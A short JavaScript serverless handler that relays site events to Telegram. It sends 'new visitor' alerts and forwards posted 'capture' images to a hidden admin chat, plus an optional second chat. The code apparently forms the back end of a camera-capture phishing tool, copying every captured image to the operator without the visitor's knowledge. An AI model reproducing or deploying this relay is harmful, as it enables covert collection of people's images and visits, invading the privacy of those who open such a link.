export default async function handler(req, res){

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;

  const { image, caption, chatId, type } = req.body;

  async function sendPhoto(id){
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        chat_id: id,
        photo: image,
        caption: caption
      })
    });
  }

  // Visit log
  if(type === "visit"){
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: "🌐 New visitor on site"
      })
    });

    return res.json({ok:true});
  }

  // Capture send
  if(type === "capture"){
    await sendPhoto(ADMIN_ID);

    if(chatId){
      await sendPhoto(chatId);
    }

    return res.json({ok:true});
  }

}
